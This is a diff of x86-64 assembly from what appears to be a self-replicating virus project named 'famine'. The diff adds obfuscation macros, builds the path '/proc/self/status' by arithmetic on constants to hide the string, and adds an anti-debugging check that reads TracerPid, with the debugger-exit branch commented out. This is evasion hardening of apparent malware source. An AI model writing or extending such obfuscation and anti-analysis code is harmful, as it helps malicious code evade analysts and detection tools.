@@ -6,40 +6,73 @@ global  _start                              ;must be declared for linker (ld)
 _start:   ;Entry-Point
 OBF_GENERIC
 PUSH
+OBF_GENERIC
+
 mov rbp, rsp
 sub rbp, famine_size  ; reserve famine_size bytes on the stack
 
+OBF_GENERIC
 .check_status:		;open the /proc/self/status
+OBF_GENERIC
 xor rdi ,rdi
 lea rdi, [rel pfile]
+lea rdi, STACK(famine.file_path)
+
+
+;BUILD STRING /proc/self/status FOR OBF
+mov rsi, 0x1E40AEC66F2F
+mov rax, 0x1122C0AC0100
+add rsi, rax
+mov qword[rdi], rsi
+add rdi, 6
+mov rsi, 0x500A87BF3341
+mov rax, 0x2324DEAD3232
+add rsi, rax
+mov qword[rdi], rsi
+add rdi, 6
+mov rsi, 0x72729481A8
+mov rax, 0x0102DFDFCC
+add rsi, rax
+mov qword[rdi], rsi
+sub rdi, 12
+
+
 mov rsi, O_RDONLY
 mov rax, _open
 syscall
 cmp rax, 0
 jl _exx
 
+OBF_GENERIC
 lea rsi, STACK(famine.status_str)  ; buf address for read /proc/self/status
 mov rdi, rax   ; fd from previous read
 mov rdx, 110
 mov rax, _read
 syscall
+cmp rax, 0
+jb _exx_pop
 
 lea r12, STACK(famine.status_str)
 mov r11, 7
+OBF_GENERIC
 .loop_status:
+OBF_GENERIC
 inc r12
 cmp byte[r12], 0x0a
 jne .nope
+OBF_GENERIC
 dec r11
 cmp r11, 0
 je .check_trcr
 .nope:
+OBF_GENERIC
 loop .loop_status
 
 .check_trcr:
 add r12, 12
+OBF_GENERIC
 cmp byte[r12], 0x30		;	CMP TRACERPID VAL WITH 0
-jne _exx_pop
+;jne _exx_pop
 
 
 
